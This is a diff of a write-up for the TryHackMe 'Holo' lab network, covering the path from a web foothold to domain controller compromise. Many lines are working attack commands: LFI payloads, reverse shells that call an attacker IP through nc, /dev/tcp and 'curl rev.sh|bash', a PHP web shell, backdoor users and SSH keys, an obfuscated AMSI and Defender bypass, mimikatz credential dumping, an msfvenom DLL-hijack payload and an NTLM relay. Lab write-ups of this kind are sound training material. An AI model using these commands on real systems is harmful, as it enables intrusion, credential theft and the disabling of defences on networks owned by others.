@@ -1024,33 +1024,33 @@ Let's check out dev.holo.live, if the Local File Inclusion vulnerability can be 
 
 This is the main page of dev.holo.live:
 
-![dev.holo.live](dev.holo.live.png)
+![dev.holo.live](img/dev.holo.live.png)
 
 This is the talent page of dev.holo.live:
 
-![talent-dev.holo.live](talent-dev.holo.live.png)
+![talent-dev.holo.live](img/talent-dev.holo.live.png)
 
-![talent-1-dev.holo.live](talent-1-dev.holo.live.png)
+![talent-1-dev.holo.live](img/talent-1-dev.holo.live.png)
 
 This is the source for the talent page of dev.holo.live:
 
-![source-talent-dev.holo.live](source-talent-dev.holo.live.png)
+![source-talent-dev.holo.live](img/source-talent-dev.holo.live.png)
 
 Looking at the source for talent page of dev.holo.live, we have notice there is a possibly of Local File Inclusion vulnerability --- ` img.php?file= `
 
 Let's try out --- the payload we used is ` http://dev.holo.live/img.php?file=../../../etc/passwd `
 
-![lfi-img.php-dev.holo.live](lfi-img.php-dev.holo.live.png)
+![lfi-img.php-dev.holo.live](img/lfi-img.php-dev.holo.live.png)
 
 Now, let's modified our payload to ` http://dev.holo.live/img.php?file=../../../var/www/admin/supersecretdir/creds.txt `
 
 This will allow us try to retreive the ` creds.txt ` stated in ` robots.txt ` of admin.holo.live as we know development environment usually is a replication of production environment.
 
-![creds-img.php-dev.holo.live](creds-img.php-dev.holo.live.png)
+![creds-img.php-dev.holo.live](img/creds-img.php-dev.holo.live.png)
 
 Now we get a credentials, let's try to login to admin.holo.live:
 
-![login-success-admin.holo.live](login-success-admin.holo.live.png)
+![login-success-admin.holo.live](img/login-success-admin.holo.live.png)
 
 Once we login, we check on the source of dashboard.php, right away we notice there is PHP Rmote Code Execution ([OWASP Command Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)) under the comment for "visitor visted today"
 
@@ -1060,9 +1060,9 @@ Once we login, we check on the source of dashboard.php, right away we notice the
 
 Let's try out --- the payload we used is ` http://admin.holo.live/dashboard.php?cmd=ls+-la%20&&%20echo%20%22%22 `
 
-![rce-1-dashboard.php-admin.holo.live](rce-1-dashboard.php-admin.holo.live.png)
+![rce-1-dashboard.php-admin.holo.live](img/rce-1-dashboard.php-admin.holo.live.png)
 
-![rce-2-dashboard.php-admin.holo.live](rce-2-dashboard.php-admin.holo.live.png)
+![rce-2-dashboard.php-admin.holo.live](img/rce-2-dashboard.php-admin.holo.live.png)
 
 Let's modofied our payload to get reverse shell to ` http://admin.holo.live/dashboard.php?cmd=nc%20-c%20bash%2010.50.103.20%2018888 `
 
@@ -1074,21 +1074,21 @@ curl http://admin.holo.live/dashboard.php?cmd=nc%20-c%20bash%2010.50.103.20%2018
 
 Reverse shell called back from admin.holo.live:
 
-![reverse-shell-admin.holo.live](reverse-shell-admin.holo.live.png)
+![reverse-shell-admin.holo.live](img/reverse-shell-admin.holo.live.png)
 
 Enumeration directories on target system:
 
-![enumerate-system-1-admin.holo.live.png](enumerate-system-1-admin.holo.live.png)
+![enumerate-system-1-admin.holo.live.png](img/enumerate-system-1-admin.holo.live.png)
 
 We found db_connect.php:
 
-![db_connect.php-admin.holo.live](db_connect.php-admin.holo.live.png)
+![db_connect.php-admin.holo.live](img/db_connect.php-admin.holo.live.png)
 
 We enumerated through ` /var/www ` and found ` user.txt `:
 
-![user.txt-1-admin.holo.live](user.txt-1-admin.holo.live.png)
+![user.txt-1-admin.holo.live](img/user.txt-1-admin.holo.live.png)
 
-![user.txt-2-admin.holo.live](user.txt-2-admin.holo.live.png)
+![user.txt-2-admin.holo.live](img/user.txt-2-admin.holo.live.png)
 
 Next we enumerated through ` / ` directory and located .dockerenv, this file exist and let us know current system is a docker container.
 
@@ -1096,17 +1096,17 @@ Next we enumerated through ` / ` directory and located .dockerenv, this file exi
 find / -type f -name "*.dockerenv" -ls 2>/dev/null
 ```
 
-![dockerenv-admin.holo.live](dockerenv-admin.holo.live.png)
+![dockerenv-admin.holo.live](img/dockerenv-admin.holo.live.png)
 
 Since this is a docker container, we know that docker usually create docker network as internal network to connect diffirent containers, we decided to check out the network information from current docker container by using ` ifconfig `.
 
-![ifconfig-admin.holo.live](ifconfig-admin.holo.live.png)
+![ifconfig-admin.holo.live](img/ifconfig-admin.holo.live.png)
 
 From the netwoork information shown, we currently on ` 192.168.100.0/24 ` network which is inaccessible from Holo corporate network (10.200.107.0/24)
 
 We then check on  the routing information by using ` route -nv `
 
-![route-admin.holo.live](route-admin.holo.live.png)
+![route-admin.holo.live](img/route-admin.holo.live.png)
 
 From the routing, we know the gateway is ` 192.168.100.1 `
 
@@ -1116,41 +1116,41 @@ Let's perform a quick port scanning on ` 192.168.100.1 ` leveraging the netcat b
 for port in {1..20000}; do timeout 2 nc -znv 192.168.100.1 $port 2>&1 | grep open ; done
 ```
 
-![port-scan-192.168.100.1](port-scan-192.168.100.1.png)
+![port-scan-192.168.100.1](img/port-scan-192.168.100.1.png)
 
 From the port scanning result, we know that there is mysql service running on ` 192.168.100.1 `, we may use the credential found previously (db_connect.php) to login into mysql server which reside on ` 192.168.100.1 `
 
 We can confirmed this by checking if mysql client connection is running on current docker container by using ` ps -elf | grep mysql `
 
-![mysql-client-192.168.100.100](mysql-client-192.168.100.100.png)
+![mysql-client-192.168.100.100](img/mysql-client-192.168.100.100.png)
 
 Let's login to mysql server on ` 192.168.100.1 ` by ` mysql -u admin -p -h 192.168.100.1 `
 
-![login-mysql-192.168.100.1](login-mysql-192.168.100.1.png)
+![login-mysql-192.168.100.1](img/login-mysql-192.168.100.1.png)
 
 We then perform enumeration and information gathering from mysql server:
 
 - First, we check on the version of mysql server --- ` SHOW VARIABLES LIKE “%version%”; `
 
-    ![show-variable-version](show-variable-version.png)
+    ![show-variable-version](img/show-variable-version.png)
 
 - Then we get the information of databases available --- ` show databases; `
 
-    ![show-databases](show-databases.png)
+    ![show-databases](img/show-databases.png)
 
 - There is one database is not the default database created by mysql --- ` DashboardDB `, we have selected this database to enumerate further
 
-    ![use-dashboarddb](use-dashboarddb.png)
+    ![use-dashboarddb](img/use-dashboarddb.png)
 
 - We use ` show tables; ` to understand what are the tables available on this ` DashboardDB ` database and we found a user table, we have dump the enitre user table out.
 
-    ![show-tables](show-tables.png)
+    ![show-tables](img/show-tables.png)
 
 - We also dumping the user table from mysql database, as we know this is the table store the credentials of mysql by ` SELECT User FROM mysql.user; ` and ` ELECT host,User,authentication_string FROM mysql.user; `
 
-    ![user-mysql-1](user-mysql-1.png)
+    ![user-mysql-1](img/user-mysql-1.png)
 
-    ![user-mysql-2](user-mysql-2.png)
+    ![user-mysql-2](img/user-mysql-2.png)
 
 As we have the access to mysql server on ` 192.168.100.1 `, we can exploit the mysql server to escape current docker container and gain access to the host system.
 
@@ -1178,7 +1178,7 @@ SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/she
 curl 192.168.100.1:8080/shell.php?cmd=whoami
 ```
 
-![generate-backdoor-via-sql-injection](generate-backdoor-via-sql-injection.png)
+![generate-backdoor-via-sql-injection](img/generate-backdoor-via-sql-injection.png)
 
 We have the php working, we can craft and get reverse shell callback from host system to our attacker machine.
 
@@ -1189,17 +1189,17 @@ First, we crafted a reverse shell bash script named "rev.sh" on our local attack
 bash -i >& /dev/tcp/10.50.103.20/23333 0>&1
 ```
 
-![rev.sh-1](rev.sh-1.png)
+![rev.sh-1](img/rev.sh-1.png)
 
-![rev.sh-2](rev.sh-2.png)
+![rev.sh-2](img/rev.sh-2.png)
 
 Next, we spin up python web server allow target host system to get our reverse shell script --- ` pythom -m http.server 80 `
 
-![python-http-server](python-http-server.png)
+![python-http-server](img/python-http-server.png)
 
 In the meantime, we aalso aspin up netcat listener to catch the callback from target host system --- ` sudo nc -lnvvp 23333 `
 
-![nc-2333](nc-23333.png)
+![nc-2333](img/nc-23333.png)
 
 Now, back to our docker container system, using curl to allow 192.168.100.1 get our reverse shell script and execute it by bash.
 
@@ -1214,15 +1214,15 @@ curl 'http://192.168.100.1:8080/shell.php?cmd=curl http://10.50.103.20:80/rev.sh
 curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.103.20%3A80%2Frev.sh%7Cbash%20%26'
 ```
 
-![curl-payload](curl-payload.png)
+![curl-payload](img/curl-payload.png)
 
 Response of python web server on our attacker machines:
 
-![response-python-web-server](response-python-web-server.png)
+![response-python-web-server](img/response-python-web-server.png)
 
 Response of netcat listener on our attacker machines:
 
-![reponse-nc](reponse-nc.png)
+![reponse-nc](img/reponse-nc.png)
 
 Right away, we search for binaries with setuid bit using command below:
 
@@ -1232,35 +1232,35 @@ find / -type f -perm -04000 -ls 2>/dev/null
 
 Result of setuid bit binaries:
 
-![setuid-bit-binaries](setuid-bit-binaries.png)
+![setuid-bit-binaries](img/setuid-bit-binaries.png)
 
 We notice unsual ` docker ` binary with setuid, searching online with the reference <https://gtfobins.github.io/gtfobins/docker/#suid> showing we are able to exploit such ` docker ` binary with setuid bit to escalate privilege to root.
 
-![docker-setuid](docker-setuid.png)
+![docker-setuid](img/docker-setuid.png)
 
 The payload we used is ` docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh -p `
 
 Privilege Escalation to root:
 
-![privesc-root](privesc-root.png)
+![privesc-root](img/privesc-root.png)
 
 We found user.txt at /var/www directory:
 
-![user.txt-10.200.107.33](user.txt-10.200.107.33.png)
+![user.txt-10.200.107.33](img/user.txt-10.200.107.33.png)
 
 Since we are root, we found root.txt at /root:
 
-![root.txt-10.200.107.33](root.txt-10.200.107.33.png)
+![root.txt-10.200.107.33](img/root.txt-10.200.107.33.png)
 
-![content-root.txt](content-root.txt.png)
+![content-root.txt](img/content-root.txt.png)
 
 Next, we going to enumerate system.
 
 First, dumping /etc/passwd and /etc/shadow as we know passwd and shadow are useful for us to gain access to the system as well as cracking the password of valid user:
 
-![etc-passwd](etc-passwd.png)
+![etc-passwd](img/etc-passwd.png)
 
-![etc-shadow](etc-shadow.png)
+![etc-shadow](img/etc-shadow.png)
 
 From the /etc/passwd, we know that - there is one non-system user --- ` linux-admin `
 
@@ -1274,17 +1274,17 @@ ssh-keygen -t rsa -f fake_id_rsa -P "" && cat fake_id_rsa.pub
 
 sshkey genreated:
 
-![sshkey-generation](sshkey-generation.png)
+![sshkey-generation](img/sshkey-generation.png)
 
 Insert attacker sshkey to root user account on target system:
 
-![insert-sshkey-root](insert-sshkey-root.png)
+![insert-sshkey-root](img/insert-sshkey-root.png)
 
 Insert attacker sshkey to linux-admin user account on target system - including create ` .ssh ` directory as linux-admin does not have such directory that contain sshkey:
 
-![create-.ssh-folder-linux-admin](create-.ssh-folder-linux-admin.png)
+![create-.ssh-folder-linux-admin](img/create-.ssh-folder-linux-admin.png)
 
-![insert-sshkey-linux-admin](insert-sshkey-linux-admin.png)
+![insert-sshkey-linux-admin](img/insert-sshkey-linux-admin.png)
 
 We also create additional user just in case and as a secondary source to gain access back to the system.
 
@@ -1298,7 +1298,7 @@ useradd -m hacker
 echo hacker:hacker | chpasswd
 ```
 
-![create-user-change-password](create-user-change-password.png)
+![create-user-change-password](img/create-user-change-password.png)
 
 Back to our attacker machine, as we have the shadow file; we can try to crack the password especially for the user "linux-admin"
 
@@ -1308,15 +1308,15 @@ The hashcat command used to crack "linux-admin" password as below (note that we 
 hashcat.exe -m 1800 test2.hccapx ..\password-list\simple-rockyou.lst -o ..\cracked.txt -O
 ```
 
-![hashcat-command](hashcat-command.png)
+![hashcat-command](img/hashcat-command.png)
 
 The "test2.hccapx" is the hash for "linux-admin" user password from shadow file:
 
-![linux-admin-shadow-hash](linux-admin-shadow-hash.png)
+![linux-admin-shadow-hash](img/linux-admin-shadow-hash.png)
 
 Result of hashcat:
 
-![result-of-hashcat](result-of-hashcat.png)
+![result-of-hashcat](img/result-of-hashcat.png)
 
 As of now, we have completely own system ` 10.200.107.33 `
 
@@ -1330,7 +1330,7 @@ nmap -nvv -sn 10.200.107.0/24 | grep -B 1 up
 
 Result of network scan for host alive:
 
-![network-scan-for-host-alive](network-scan-for-host-alive.png)
+![network-scan-for-host-alive](img/network-scan-for-host-alive.png)
 
 From the nmap network scan result, we know that - there are several system on the network:
 
@@ -1349,7 +1349,7 @@ nmap -nvv -Pn -T4 -F 10.200.107.30
 
 Nmap result for 10.200.107.30
 
-![nmap-10.200.107.30](nmap-10.200.107.30.png)
+![nmap-10.200.107.30](img/nmap-10.200.107.30.png)
 
 Scan for 10.200.107.31 using command below:
 
@@ -1359,7 +1359,7 @@ nmap -nvv -Pn -T4 -F 10.200.107.31
 
 Nmap result for 10.200.107.31
 
-![nmap-10.200.107.31](nmap-10.200.107.31.png)
+![nmap-10.200.107.31](img/nmap-10.200.107.31.png)
 
 Scan for 10.200.107.32 using command below:
 
@@ -1369,7 +1369,7 @@ nmap -nvv -Pn -T4 -F 10.200.107.32
 
 Nmap result for 10.200.107.32
 
-![nmap-10.200.107.32](nmap-10.200.107.32.png)
+![nmap-10.200.107.32](img/nmap-10.200.107.32.png)
 
 Scan for 10.200.107.35 using command below:
 
@@ -1379,23 +1379,27 @@ nmap -nvv -Pn -T4 -F 10.200.107.35
 
 Nmap result for 10.200.107.35
 
-![nmap-10.200.107.35](nmap-10.200.107.35.png)
+![nmap-10.200.107.35](img/nmap-10.200.107.35.png)
+
+Do take a note on all the nmap result, it showing all other system are on Windows.
 
 We have confirmed that on our attacker machine, we are unable access to any host other than ` 10.200.107.33 `
 
 Ping result for 10.200.107.31 on our attacker machine.
 
-![ping-result-10.200.107.31](ping-result-10.200.107.31.png)
+![ping-result-10.200.107.31](img/ping-result-10.200.107.31.png)
 
 Result of port 80 - http for 10.200.107.31 on our attacker machine
 
-![port-80-10.200.107.31](port-80-10.200.107.31.png)
+![port-80-10.200.107.31](img/port-80-10.200.107.31.png)
 
 With all the information we gathered, we can conclude that Holo designed their corporate network with segmentation.
 
 We will need to forward our attacker traffic to Holo corporate network levaraging the host system we gained access which is ` 10.200.107.33 `
 
 We decided to use ` sshuttle ` - a proxy tools utilise ssh to forward our attacker traffic via ssh on ` 10.200.107.33 ` to Holo corporate network ` 10.200.107.0/24 `
+
+**This is crucial for us to access other system from now on.**
 
 The command we used for ` sshuttle ` as below (note that command is executed on our attacker machine):
 
@@ -1405,21 +1409,21 @@ sudo sshuttle -D -N -r linux-admin:linuxrulez@10.200.107.33 -x 10.200.107.33 10.
 
 sshuttle command:
 
-![sshuttle-command](sshuttle-command.png)
+![sshuttle-command](img/sshuttle-command.png)
 
 Checking sshuttle process is running by issue command ` sudo ps -elf | grep sshu ` :
 
-![checking-sshuttle-process](checking-sshuttle-process.png)
+![checking-sshuttle-process](img/checking-sshuttle-process.png)
 
 After ` sshuttle ` is running, we are able to access port 80 - http for ` 10.200.107.31 ` on our attacker machine.
 
 Main page for port 80 - http - ` 10.200.107.31 `
 
-![port-80-http-10.200.107.31](port-80-http-10.200.107.31.png)
+![port-80-http-10.200.107.31](img/port-80-http-10.200.107.31.png)
 
 Source of main page for ` 10.200.107.31 `
 
-![source-main-10.200.107.31](source-main-10.200.107.31.png)
+![source-main-10.200.107.31](img/source-main-10.200.107.31.png)
 
 As ` 10.200.107.31 ` showing login page, we decide try to log into it using the credentials found previously (that we dump from the database called "DashboardDB" that is in mysql server on 192.168.100.1).
 
@@ -1427,35 +1431,35 @@ Do keep in mind, there is "Forgot Password" page that we have not explore for no
 
 Login using admin user, however it only show blank page:
 
-![admin-login](admin-login.png)
+![admin-login](img/admin-login.png)
 
 Login using gurag user, below is the response page:
 
-![gurag-login](gurag-login.png)
+![gurag-login](img/gurag-login.png)
 
 From the response of login page, we know that ` gurag ` is a valid user.
 
 Let's jump back to "Forgot Password" page.
 
-![forgot-password-page](forgot-password-page.png)
+![forgot-password-page](img/forgot-password-page.png)
 
 Source of forgot password page:
 
-![source-of-forgot-password-page](source-of-forgot-password-page.png)
+![source-of-forgot-password-page](img/source-of-forgot-password-page.png)
 
 Request header of forgot password page:
 
-![request-header-of-forgot-password-page](request-header-of-forgot-password-page.png)
+![request-header-of-forgot-password-page](img/request-header-of-forgot-password-page.png)
 
 Now we try to reset "gurag" password as it is a valid user to allow us login.
 
-![request-header-reset-gurag](request-header-reset-gurag.png)
+![request-header-reset-gurag](img/request-header-reset-gurag.png)
 
 From the request header, we can see that the password reset (initially from reset_form.php) was sent to "password_reset.php" and require a "username" and "user_token".
 
 Here is the response cookies from the reset password:
 
-![response-cookie-gurag](response-cookie-gurag.png)
+![response-cookie-gurag](img/response-cookie-gurag.png)
 
 From the response cookies, we are able to retrieve the "user_token" which is a weak password reset mechanism fall under OWASP - Broken Authentication.
 
@@ -1465,86 +1469,341 @@ The payload we used as below:
 
 ```bash
 curl http://10.200.107.31/password_reset.php?user=gurag&user_token=input_user_token_here
+
+
+# Example
+curl 'http://10.200.107.31/password_reset.php?user=gurag&user_token=68d0f48756dc369c1f900efac880c7fc6935badc03adae50d207e8595f540439721b1af96d6d7efb87d56efa398ebd491859'
 ```
 
-Password reset for "gurag":
+Password reset link for "gurag":
 
-![password-reset-gurag](password-reset-gurag.png)
+![password-reset-gurag](img/password-reset-gurag.png)
 
+And we visit the password reset page again for user "gurag", below is the response that allow us to input new password for "gurag"
 
+reset.php with request header:
 
+![reset.php-with-request-header](img/reset.php-with-request-header.png)
 
+reset.php with request cookies:
 
+![reset.php-with-request-cookies](img/reset.php-with-request-cookies.png)
 
+reset.php with response header:
 
+![reset.php-with-response-header](img/reset.php-with-response-header.png)
 
+reset.php with response cookies:
 
+![reset.php-with-response-cookies](img/reset.php-with-response-cookies.png)
 
+Once we input our new password for the user "gurag" and we get another flag.
 
+![flag-from-10.200.107.31](img/flag-from-10.200.107.31.png)
 
+Now we are able to login to <http://10.200.107.31>
 
+Here is the home page that allow us to upload image after login.
 
+![home-page-after-login-1](img/home-page-after-login-1.png)
 
+![home-page-after-login-2](img/home-page-after-login-2.png)
 
+Source of home page after login to ` 10.200.107.31 `
 
+![source-home-page-10.200.107.31](img/source-home-page-10.200.107.31.png)
 
+Here is the upload image page
 
+![upload-image-page](img/upload-image-page.png)
 
+Source of upload image page
 
+![source-upload-image-page](img/source-upload-image-page.png)
 
+From the source of upload image page, we can see that it is using a javascirpt named "upload.js" to process the upload.
 
+We have check on the "upload.js" javascript, below is what we found interesting; basically it allow us to upload anything to ` 10.200.107.31 `
 
+![content-of-upload.js](img/content-of-upload.js.png)
 
+With unrestricted file upload, we can craft a reverse shell php and upload to ` 10.200.107.31 ` that will get us access to the system.
 
+You may refer to [this link for PHP Reverse Shell](https://github.com/ivan-sincek/php-reverse-shell)
 
+Download php reverse shell code and modify the php reverse shell – providing our attacker machine ip and port to be binded.
 
+![reverse-shell-php](img/reverse-shell-php.png)
 
+Upload to ` 10.200.107.31 ` via upload page and it show successful uploaded
 
+![upload-reverse-shell-php](img/upload-reverse-shell-php.png)
 
+However, we have no idea where the file is stored in the system.
 
+For this we fire up gobuster to check what is the directory available.
 
+The gobuster command we used as below:
 
+```bash
+sudo gobuster -t 35 –delay 100ms dir -e -u http://10.200.107.31 -o TryHackMe-gobuster-dir-10.200.107.31 -w /usr/share/dirb/wordlists/common.txt
+```
 
+And here what we found, there is a directory called "images".
 
+![gobuster-result](img/gobuster-result.png)
 
+We access to the directory found and the reverse shell php is inside.
 
+![images-directory](img/images-directory.png)
 
+Next we spin up netcat listener on our attacker machine and using ` curl ` command to activate the php reverse shell we have uploaded to ` 10.200.107.31 `
 
+Here is the command we used
 
+```bash
+curl http://10.200.107.31/images/rev.php
+```
 
+Curl to activate reverse shell php
 
+![curl-activate-reverse-shell](img/curl-activate-reverse-shell.png)
 
+Here is the call-back received on our attacker machine
 
+![reverse-shell-callbacked](img/reverse-shell-callbacked.png)
 
+Right awar, we know this is a Windows system, and checking basic information as below:
 
+![basic-information-10.200.107.31](img/basic-information-10.200.107.31.png)
 
+Since this is a reverse shell which is unstable and we will need to create persistent access to the system, below is what we have done in order to gain persistent access to the system.
 
+- create a user on the system
+- add the user created to local administrator group
+- turn off windows firewall for all profile
+- add "Everyone" into "Remote Desktop Users", this will allow us to remote desktop into the system.
 
+Below is the payload we used for above mentioned tasks.
 
+```dos
+net user hacker hackP@ssw0rd /add
+net localgroup administrators hacker /add
+netsh advfirewall set allprofiles state off
+net localgroup "Remote Desktop Users" Everyone /Add
+```
 
+Here is the screenshot for those command executed successfully.
 
+![command-issued](img/command-issued.png)
 
+As we are working with Windows system, we also using powershell command below to bypass Windows AMSI, this will allow us to run command or execute tools without trigger Windows Anti-Malware system.
 
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
 
+Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
 
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
 
+Next we enumerate through the system and found the ` root.txt ` on ` C:\Users\Administrator\Desktop `
 
+root.txt found on ` 10.200.107.31 `
 
+![root.txt-10.200.107.31](img/root.txt-10.200.107.31.png)
 
+As we working on Windows system, we have uploaded most popular tools such as "mimikatz" to dump ` 10.200.107.31 ` system hashes using powershell command below:
 
+```powershell
+Invoke-WebRequest "http://10.50.103.20/mimikatz.exe" -outfile "mimikatz.exe"
+```
 
+Next, we run command below to dump all possible credential information and hashes  such as NTLM via mimikatz.
 
+```dos
+.\mimikatz "log host-31.log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit
+```
 
+And right away from mimikatz result, we found clear text credential for one of the user (watamet) on the system
 
+![watamet-cred](img/watamet-cred.png)
 
+With the credentials found, let's move on to another system.
 
+We have try the credentials found on different system, only ` 10.200.107.35 ` is accessible.
 
+![rdp-10.200.107.35](img/rdp-10.200.107.35.png)
 
+Right off the bat, we found user.txt on desktop.
 
+user.txt on 10.200.107.35
 
+![user.txt-10.200.107.35](img/user.txt-10.200.107.35.png)
 
+As we are using "watamet" user logging in ` 10.200.107.35 ` and it does not have local administrator right on the system, hence unable to execute command require admin privilege.
 
+We decided to use applocker bypass checker (that was downloaded on our attacker machine) to check if the system has enable applocker which most Windows system does and get the folder is accessible without restricted.
 
+The applocker bypass checker can be download [here](https://github.com/HackLikeAPornstar/GibsonBird/blob/master/chapter4/applocker-bypas-checker.ps1)
+
+We execute powershell command below to download the applocker bypass checker from our attacker machine:
+
+```powershell
+Invoke-WebRequest "http://10.50.103.20/applocker-bypas-checker.ps1.txt" -outfile "applocker-bypas-checker.ps1"
+```
+
+To be safe, we have download the applocker bypass checker in ` C:\Windows\Tasks `, this is the folder used by Windows Scheduled Task.
+
+Next, we run the following powershell command to start the applocker bypass checker:
+
+```powershell
+.\ applocker-bypas-checker.ps1
+```
+
+Below is the result of applocker bypass checker:
+
+![applocker-bypass-checker-result](img/applocker-bypass-checker-result.png)
+
+From here, we can confirmed that ` C:\Windows\Tasks ` is safe for us to execute command and tool.
+
+Now, we start to enumerate the system and we found a very interesting application (kavremover.exe) on ` C:\Users\watamet\Applications\ `, which is unusual path for program.
+
+![kavremover-found](img/kavremover-found.png)
+
+Immediate we check only is there any vulnerability or exploit for this application, and [here](https://medium.com/techzap/dll-hijacking-part-1-basics-b6dfb8260cf1) is what we found.
+
+It is exploitable with DLL hijacking.
+
+First we create a malicious DLL that embeded reverse shell meterpreter module form metasploit for the vulnerable application using ` msfvenom ` on out attcker machine as per below command.
+
+```bash
+sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.103.20 LPORT=16666 -f dll -o kavremoverENU.dll
+```
+
+Then we use the same ` Invoke-WebRequest ` powershell command to download the malicious DLL from our attacker machine to target syetm under ` C:\Windows\Tasks `
+
+In order for the exploit to work, we have to copy the vulnerable application from original folder to ` C:\Windows\Tasks `, as the DLL hijacking work when the vunerable application start; it will search for DLL in the same folder, this is how we exploit it.
+
+Next, we setup the metasploit multi-handler module on our attacker machine as below:
+
+```bash
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.50.103.20
+set LPORT 16666
+run -j
+```
+
+Next, we run the vulnerable application, and we got a shell call-back to meterpreter as shown below:
+
+![shell-callback-meterpreter](img/shell-callback-meterpreter.png)
+
+As we using meterpreter, we need to inject meterpreter process into the system in order to have better and stablize shell access, below is what we done to get a stablize shell.
+
+In meterpreter, we need to execute ` getsystem ` command to temporary escalate our privilege to ` NT-AUTHORITY\SYSTEM `
+
+With the ` NT-AUTHORITY\SYSTEM `, we can now run admin privilege require command.
+
+In meterpreter, use ` ps ` command to get the list of process running on ` 10.200.107.35 `
+
+![ps-meterpreter](img/ps-meterpreter.png)
+
+Then, we execute the following command to inject meterpreter process into the system:
+
+![migrate-process-meterpreter](img/migrate-process-meterpreter.png)
+
+Once done, we can execute ` shell ` command to have command line access on ` 10.200.107.35 `
+
+And we perform the same technique to gain persistent access to the system that was done on ` 10.200.107.31 `
+
+- create user and add user to local administrator group
+- add "watamet" to local administrator group
+- turn off windows firewall for all profile
+- add "Everyone" into "Remote Desktop Users"
+- bypass Windows AMSI
+- upload mimikatz and dump all the available hashes such as NTLM (alternativly we can execute ` run post/windows/gather/hashdump ` in meterpreter to dump hashes as well)
+
+Then we start enumerate the system and found root.txt on ` C:\Users\Administrator\Desktop `
+
+![root.txt-10.200.107.35](img/root.txt-10.200.107.35.png)
+
+Beside, we execute command below to check if the system joined domain or any domain user:
+
+```dos
+net user /domain
+```
+
+And the result show current system ` 10.200.107.35 ` is joined `HOLOLIVE` domain and the domain server is ` DC-SRV01 ` (alternatively, the mimikatz result show the same)
+
+We run the following command ` nslookup DC-SRV01 `, it resolved to ` 10.200.107.30 `
+
+We decided to attack on ` DC-SRV01 ` domain server - ` 10.200.107.30 ` using NTLM relay attack, for this we use the popular [Impacket - ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) which is downloaded on our attacker machine and run it with below command:
+
+```bash
+sudo python3 ntlmrelayx.py -t smb://10.200.107.30 -smb2support -socks
+```
+
+In order for ntlm relay attack to function, we have to perform below action on the system that we have access to which is ` 10.200.107.35 ` - that is also accessible to ` 10.200.107.30 `:
+
+- Execute command below to stop the SMB services on ` 10.200.107.35 `, that allow us to intercept and relay the smb session from our attacker machine.
+
+    ```dos
+    sc stop netlogon
+    sc stop lanmanserver
+    sc config lanmanserver start= disabled
+    sc stop lanmanworkstation
+    sc config lanmanworkstation start= disabled
+    ```
+
+- Once done, we execute the following command ` shutdown /r /t 0 ` to restart ` 10.200.107.35 `
+
+- We can perform nmap scanning to ensure the smb service is not running with ` nmap -p 445 10.200.107.35 `
+
+    ![nmap-445-10.200.107.35](img/nmap-445-10.200.107.35.png)
+
+- On our attacker machine, once ` 10.200.107.35 ` is up and meterpreter session will be connected and execute command below to forward smb traffic from ` 10.200.107.35 ` back to our attacker machine.
+
+    ```bash
+    portfwd add -R -L 0.0.0.0 -l 445 -p 445
+    ```
+
+Once above action taken, the exploitation is completed as shown below (It may take up to 3 minutes for Impacket - ntlmrelayx to start receive smb traffic):
+
+![ntlmrelayx-success](img/ntlmrelayx-success.png)
+
+As we success exploit smb session with ntlm relay attack, we decided to use the popular tools from [Impacket - smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) that is downloaded on our attacker machine to gain access to ` 10.200.107.30 ` in conjunction with ` proxychain `
+
+To use smbexec with proxychain, we have added below line into ` /etc/proxychain.conf ` on our attacker machine (we have install proxychain prior using ` sudo apt install -y proxychains ` command on our attacker machine).
+
+```
+socks4 127.0.0.1 1080
+```
+
+Once ready, we execute the following command, it will launch shell access on ` 10.200.107.30 `
+
+```bash
+sudo proxychains python3 ./smbexec.py -no-pass HOLOLIVE/SRV-ADMIN@10.200.107.30 -shell-type cmd
+```
+
+![smbexec-command](img/smbexec-command.png)
+
+And we perform the same technique to gain persistent access to the system that was done on ` 10.200.107.31 `
+
+- create user and add user to local administrator group
+- add "watamet" to local administrator group
+- turn off windows firewall for all profile
+- add "Everyone" into "Remote Desktop Users"
+- bypass Windows AMSI
+- upload mimikatz and dump all the available hashes such as NTLM (alternativly we can execute ` run post/windows/gather/hashdump ` in meterpreter to dump hashes as well)
+
+Then we start enumerate the system and found root.txt on ` C:\Users\Administrator\Desktop `
+
+![root.txt-10.200.107.30](img/root.txt-10.200.107.30.png)
+
+With this, we have own the entire Holo corporate network and Holo domain controller.
+
+Side note, we have try various method to attack ` 10.200.107.32 ` however the attack is unsuccessful.
 
 <br />
 
